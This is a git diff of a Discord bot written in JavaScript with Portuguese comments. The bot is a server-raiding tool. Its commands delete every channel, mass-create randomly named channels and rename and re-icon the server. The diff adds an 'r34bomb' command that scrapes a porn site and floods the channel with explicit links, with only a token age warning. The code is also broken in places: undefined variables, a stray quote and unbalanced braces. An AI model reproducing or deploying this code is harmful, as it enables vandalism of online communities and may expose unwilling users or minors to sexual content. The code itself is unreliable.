@@ -15,17 +15,20 @@
   */
 
 
-const Discord = require("discord.js");
-const client = new Discord.Client();
+const { Client, Attachment } = require("discord.js");
+const bot = new Client();
+const cheerio = require("cheerio")
+const prefix = '!!';
 
-client.on("ready", () => { 
+bot.on("ready", () => { 
     console.log(`Defoko 2.1`)
     console.log(`prontuh, creditor al le mene padero`)
     client.user.setActivity(process.env.STATUS);
 });
 
-client.on("message", async (message) => {
+bot.on("message", async (message) => {
     const server = message.guild.channels;
+    let args = message.content.substring(prefix.length).split(" ");
 
     function makeid(length) { //peguei do stack overflow n lembro onde
         let result = ' ';
@@ -37,8 +40,57 @@ client.on("message", async (message) => {
         }
         return result;
     }
+    function emoji(id){
+	 return bot.emojis.get(id).toString();
+    }
+    function randmizr(min, max){
+	 let step1 = max - min + 1;
+	 let step2 = Math.random * step1;
+	 let result = Math.floor(step2) + min;
+	 return result;
+    }
+    function image(){
+	let randomstuff = ['anal', 'futa', 'furry', 'cum', 'breasts', '1boy', '1girls', 'male', 'female', 'gay'];
+	let randomcategory = randmizr(0, randomstuff.length-1);
+	let tag = randomstuff[randomcategory];
+	let options = {
+	     url: "https://rule34.xxx/index.php?page=post&s=list&tags=" + tag",
+	     method: "GET",
+	     headers: {
+		 "Accept": "text/html",
+		 "User-Agent": "Chrome"
+	     }
+	};
+	request(options, function(error, response, responseBody) {
+        if (error) {
+            return message.channel.send(`Erro eee ${error}`);
+        }
+ 
+ 
+        $ = cheerio.load(responseBody);
+ 
+ 
+        var links = $(".image a.link");
+ 
+        var urls = new Array(links.length).fill(0).map((v, i) => links.eq(i).attr("href"));
+       
+        console.log(urls);
+ 
+        if (!urls.length) {
+           
+            return;
+        }
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+        message.channel.send( urls[Math.floor(Math.random() * urls.length)]);
+	
+    }
     
-    if(message.content === '!!lol') {
+    switch (args[0]) {
+       case 'lol':
        message.delete();
        let i;
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)
@@ -52,21 +104,35 @@ client.on("message", async (message) => {
 	    	message.guild.createChannel(`${texto}`, 'voice');  
 	    	message.guild.setIcon('./icon.png') 
 	}
-    }
-    if(message.content === '!!del'){
-	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
-	    message.delete();
-	    message.channel.send(`oia o lag`);
-        server.deleteAll();
-	message.guild.setIcon('./icon.png') 
-        const texth = makeid(32);
-	    message.guild.createChannel(`${texth}`, 'text');	
-	    message.guild.setName(process.env.SERVER_NAME + `${texth}`)
-	    message.guild.setIcon('./icon.png')  
-    }
-});
+       break;
 
-client.login(process.env.BOT_TOKEN);
+       case 'del':
+       console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
+       message.delete();
+       message.channel.send(`oia o lag`);
+       server.deleteAll();
+       message.guild.setIcon('./icon.png') 
+       const texth = makeid(32);
+       message.guild.createChannel(`${texth}`, 'text');	
+       message.guild.setName(process.env.SERVER_NAME + `${texth}`)
+       message.guild.setIcon('./icon.png')  
+       break;
+
+       case 'r34bomb':
+	    /* ALERTAA / ALERT 
+	    	ESTE COMANDO É UM COMANDO NSFW
+		SE VC É DE MENOR SAIA
+		--------------
+		IF YOUR UNDERAGE GET OUT OF HERE
+		THIS IS A NSFW COMMAND
+	    */
+	    message.channel.send(`HentaiBomb em 2 segundos, fechem os olhos crianças ` + emoji("616026244823384065"))
+	    image()
+       break; 
+    }
+}});
+
+bot.login(process.env.BOT_TOKEN);
 
 //para de olhar aqui poha
 //- mene padero
